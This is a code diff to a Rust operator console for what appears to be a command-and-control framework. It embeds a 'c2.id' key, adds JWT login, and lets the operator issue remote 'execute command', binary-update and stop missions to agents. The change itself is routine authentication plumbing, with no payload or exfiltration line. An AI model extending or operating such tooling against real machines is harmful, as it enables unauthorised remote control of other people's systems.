@@ -9,10 +9,13 @@ mod error;
 mod selection;
 mod utils;
 
-// const PLATFORMS: &[Item<&str, model::Platform, fn() -> model::Platform>] = &[
-//     Item::new("Unix", || model::Platform::Unix),
-//     Item::new("Windows", || model::Platform::Windows),
-// ];
+const IDENTITY: [u8; crypto::ED25519_SECRET_KEY_SIZE] = *include_bytes!("../../c2.id");
+
+// TODO This is not a good solution
+pub fn jwt() -> ClientResult<String> {
+    let mut signing_key = crypto::get_signing_key_from(&IDENTITY);
+    Ok(client::login(&mut signing_key)?)
+}
 
 const MAIN_MENU_COMMANDS: &[Item<
     &str,
@@ -20,7 +23,7 @@ const MAIN_MENU_COMMANDS: &[Item<
     fn() -> ClientResult<Option<Menu>>,
 >] = &[
     Item::new("Select agent", || {
-        let agents = client::agents::get()?;
+        let agents = client::agents::get(&jwt()?)?;
         if agents.is_empty() {
             println!("No agents available");
             return Ok(None);
@@ -51,7 +54,7 @@ const MAIN_MENU_COMMANDS: &[Item<
             println!("No agent selected");
             return Ok(None);
         };
-        client::agents::delete(agent.id)?;
+        client::agents::delete(&jwt()?, agent.id)?;
         Ok(None)
     }),
     Item::new("[dbg] Generate identity key pair", || {
@@ -74,7 +77,10 @@ const MAIN_MENU_COMMANDS: &[Item<
             BASE64_STANDARD.encode(signing_key.as_bytes())
         );
         println!("[+] Private key: {:?}", BASE64_STANDARD.encode(private_key));
-        println!("[+] Crypto negociation: {}", serde_json::to_string(&crypto_negociation)?);
+        println!(
+            "[+] Crypto negociation: {}",
+            serde_json::to_string(&crypto_negociation)?
+        );
         Ok(None)
     }),
 ];
@@ -91,6 +97,7 @@ const AGENT_COMMANDS: for<'a> fn(
             "Execute command",
             Box::new(move || {
                 let mission = client::missions::issue(
+                    &jwt()?,
                     agent.id,
                     model::Task::Execute(utils::prompt("Command", None)?),
                 )?;
@@ -110,6 +117,7 @@ const AGENT_COMMANDS: for<'a> fn(
                 };
 
                 let mission = client::missions::issue(
+                    &jwt()?,
                     agent.id,
                     model::Task::Update(model::Release {
                         checksum: common::checksum(bin_path)?,
@@ -128,24 +136,27 @@ const AGENT_COMMANDS: for<'a> fn(
         Item::new(
             "Update agent data",
             Box::new(|| {
-                client::agents::update(&model::Agent {
-                    name: utils::prompt("Agent name", Some(agent.name.clone()))?,
-                    identity: crypto::VerifyingKey::from_bytes(
-                        fs::read(utils::prompt("Agent identity public key file path", None)?)?
-                            .as_slice()
-                            .try_into()
-                            .unwrap(),
-                    )
-                    .unwrap(),
-                    ..agent.clone()
-                })?;
+                client::agents::update(
+                    &jwt()?,
+                    &model::Agent {
+                        name: utils::prompt("Agent name", Some(agent.name.clone()))?,
+                        identity: crypto::VerifyingKey::from_bytes(
+                            fs::read(utils::prompt("Agent identity public key file path", None)?)?
+                                .as_slice()
+                                .try_into()
+                                .unwrap(),
+                        )
+                        .unwrap(),
+                        ..agent.clone()
+                    },
+                )?;
                 Ok(None)
             }),
         ),
         Item::new(
             "Stop agent",
             Box::new(move || {
-                let mission = client::missions::issue(agent.id, model::Task::Stop)?;
+                let mission = client::missions::issue(&jwt()?, agent.id, model::Task::Stop)?;
                 utils::poll_mission_result(mission.id);
                 Ok(None)
             }),
